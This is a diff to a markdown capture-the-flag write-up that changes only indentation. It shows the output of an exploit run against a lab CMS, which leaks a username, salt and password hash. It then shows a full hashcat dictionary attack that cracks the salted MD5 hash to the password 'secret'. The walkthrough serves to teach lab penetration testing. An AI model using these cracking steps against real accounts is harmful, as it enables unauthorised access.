@@ -115,86 +115,87 @@ Shellcodes: No Results
 ### What's the password?
 - **Answer:** secret
 - **Steps to Reproduce:** 
-    - Run the exploit:
+- Run the exploit:
 
-    ```bash
-    [+] Salt for password found: 1dac0d92e9fa6bb2
-    [+] Username found: mitch
-    [+] Email found: admin@admin.com
-    [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
-    ```
-    - Crack the hash:
+```bash
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+```
 
-    ```bash
-    $ hashcat -m 20 hash.txt --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
-    hashcat (v6.1.1) starting...
+- Crack the hash:
 
-    OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-    =============================================================================================================================
-    * Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2884/2948 MB (1024 MB allocatable), 1MCU
+```bash
+$ hashcat -m 20 hash.txt --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
+hashcat (v6.1.1) starting...
 
-    Minimum password length supported by kernel: 0
-    Maximum password length supported by kernel: 256
-    Minimim salt length supported by kernel: 0
-    Maximum salt length supported by kernel: 256
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2884/2948 MB (1024 MB allocatable), 1MCU
 
-    Hashes: 1 digests; 1 unique digests, 1 unique salts
-    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-    Rules: 1
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
 
-    Applicable optimizers applied:
-    * Zero-Byte
-    * Early-Skip
-    * Not-Iterated
-    * Single-Hash
-    * Single-Salt
-    * Raw-Hash
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
 
-    ATTENTION! Pure (unoptimized) backend kernels selected.
-    Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
-    If you want to switch to optimized backend kernels, append -O to your commandline.
-    See the above message to find out about the exact limits.
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
 
-    Watchdog: Hardware monitoring interface not found on your system.
-    Watchdog: Temperature abort trigger disabled.
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
 
-    Host memory required for this attack: 64 MB
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
 
-    Dictionary cache built:
-    * Filename..: /usr/share/seclists/Passwords/Common-Credentials/best110.txt
-    * Passwords.: 110
-    * Bytes.....: 849
-    * Keyspace..: 110
-    * Runtime...: 0 secs
+Host memory required for this attack: 64 MB
 
-    The wordlist or mask that you are using is too small.
-    This means that hashcat cannot use the full parallel power of your device(s).
-    Unless you supply more work, your cracking speed will drop.
-    For tips on supplying more work, see: https://hashcat.net/faq/morework
+Dictionary cache built:
+* Filename..: /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+* Passwords.: 110
+* Bytes.....: 849
+* Keyspace..: 110
+* Runtime...: 0 secs
 
-    Approaching final keyspace - workload adjusted.  
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
 
-    0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
-                                                    
-    Session..........: hashcat
-    Status...........: Cracked
-    Hash.Name........: md5($salt.$pass)
-    Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
-    Time.Started.....: Sun Jun  6 22:14:13 2021 (0 secs)
-    Time.Estimated...: Sun Jun  6 22:14:13 2021 (0 secs)
-    Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
-    Guess.Queue......: 1/1 (100.00%)
-    Speed.#1.........:   474.2 kH/s (0.03ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
-    Recovered........: 1/1 (100.00%) Digests
-    Progress.........: 110/110 (100.00%)
-    Rejected.........: 0/110 (0.00%)
-    Restore.Point....: 0/110 (0.00%)
-    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-    Candidates.#1....: 000000 -> zxczxc
+Approaching final keyspace - workload adjusted.  
 
-    Started: Sun Jun  6 22:13:43 2021
-    Stopped: Sun Jun  6 22:14:15 2021
-    ```
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+                                                
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: md5($salt.$pass)
+Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
+Time.Started.....: Sun Jun  6 22:14:13 2021 (0 secs)
+Time.Estimated...: Sun Jun  6 22:14:13 2021 (0 secs)
+Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   474.2 kH/s (0.03ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 110/110 (100.00%)
+Rejected.........: 0/110 (0.00%)
+Restore.Point....: 0/110 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 000000 -> zxczxc
+
+Started: Sun Jun  6 22:13:43 2021
+Stopped: Sun Jun  6 22:14:15 2021
+```
     
 ---
 
